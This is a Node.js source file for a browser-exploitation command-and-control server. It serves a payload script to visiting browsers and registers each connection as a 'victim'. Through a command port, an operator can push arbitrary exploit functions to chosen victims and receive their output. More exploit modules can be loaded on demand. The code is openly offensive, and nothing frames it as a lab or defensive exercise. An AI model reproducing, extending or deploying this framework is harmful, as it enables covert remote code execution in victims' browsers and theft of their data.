const http = require('http')
const ws = require('ws')

const config = require('./config')
const client = require('./client')
let exploits = require('./exploits') // Not const for dynamic exploit adding

const victims = {} // Map of victim name to victim connection

// Whitelists which commands can be used
const cmds = {
    'help': help,
    'list': list,
    'exploit': exploit,
    'addsploits': addsploits
}

// Tells users what commands are implemented
function help(conn) {
    conn.send(Object.keys(cmds).join('|'))
}

// Provides information on the current state of the server
function list(conn, args) {
    const listables = ['victims', 'exploits']
    if(args.length < 1) {
        conn.send('Usage: list [' + listables.join('|') + ']')
    }
    switch(args[0]) {
        case 'victims':
            conn.send('' + Object.keys(victims))
            break
        case 'exploits':
            conn.send('' + Object.keys(exploits))
            break
        default:
            conn.send('The argument must be either "' + listables.join('" or "') + '"')
            break
    }
}

// Sends an exploit to the specified client
function exploit(conn, args) {
    if(args.length < 2) {
        conn.send('Usage: exploit who what\r\nTo do what to who')
        return
    }
    const who = args[0]
    if(victims[who] == undefined || !Object.keys(victims).includes(who)) {
        conn.send(who + ' is not a victim')
        return
    }
    const what = args[1]
    if(exploits[what] == undefined || !Object.keys(exploits).includes(what)) {
        conn.send(what + ' is not an exploit')
        return
    }
    const vic_conn = victims[who]
    vic_conn.on('message', data => conn.send(data))
    // Adding a string and a function reference, returns the function's definition
    vic_conn.send('(' + exploits[what] + ')()')
    console.log('Sent ' + what + ' to ' + who)
}

// Adds exploits to be sent to the client
function addsploits(conn, args) {
    if(args.length < 1) {
        conn.send('Usage: import package')
        return
    }
    try {
        // Kids, don't put user input into require, leave that to the trained professionals
        // Trained professionals, if there is another character sequence that leads to directory traversal here, please
        // let me know
        const dir_trav = ['..']
        if(dir_trav.some(s => args[0].includes(s))) {
            conn.send('You can only import sploits from child directories')
            return
        }
        // Extends the exploits object to include the imported exploits
        exploits = {...exploits, ...require('./exploits/' + args[0])}
        conn.send('' + args[0] + ' was successfully added')
    } catch {
        conn.send('' + args[0] + ' could not be added')
    }
}

function handle_cmd(conn, cmd, args) {
    // If the command isn't in the implemented commands, tell the user what commands are implemented
    if(undefined === cmds[cmd]) {
        conn.send('Implemented commands: ' + Object.keys(cmds).join(', '))
    } else {
        cmds[cmd](conn, args)
    }
}

function main() {
    // This is the server that the attacker connects to in order to control the server
    const CMD_PORT = config.cmd_port || 1337
    new ws.Server({ port: CMD_PORT })
    .on('connection', conn => {
        conn.on('message', data => {
            const cmdarr = data.split(' ')
            const cmd = cmdarr[0]
            const args = cmdarr.slice(1)
            handle_cmd(conn, cmd, args)
        })
    })
    console.log('Command server running on port ' + CMD_PORT)

    // This is the server that sends exploits to victims' browsers
    const EXPLOIT_PORT = config.exploit_port || 8000
    new ws.Server({ port: EXPLOIT_PORT })
    .on('connection', (conn, req) => {
        const vic_name = req.connection.remoteAddress + ':' + req.connection.remotePort
        // TODO Include the victim's origin
        victims[vic_name] = conn
        console.log('New victim ' + vic_name)
        // TODO Implement the ability to automatically run commands on connect
        // This removes a victim when the connection to their browser is no longer open
        conn.on('close', () => delete victims[vic_name])
    })
    console.log('Exploit server running on port ' + EXPLOIT_PORT)

    // This is the server that the victim's browser initially connects to in order to get the client
    // The client then executes whatever exploit gets sent to it
    const CLIENT_PORT = config.client_port || 8080
    http.createServer((req, res) => {
        const HOST = config.host || 'localhost'
        const server_url = '"ws://' + HOST + ':' + EXPLOIT_PORT + '"'
        let client_payload = '(' + client + ')()'
        client_payload = client_payload.replace('$$SERVER_URL$$', server_url)
        res.end(client_payload)
    }).listen(CLIENT_PORT)
    console.log('Payload server running on port ' + CLIENT_PORT)
}

main()
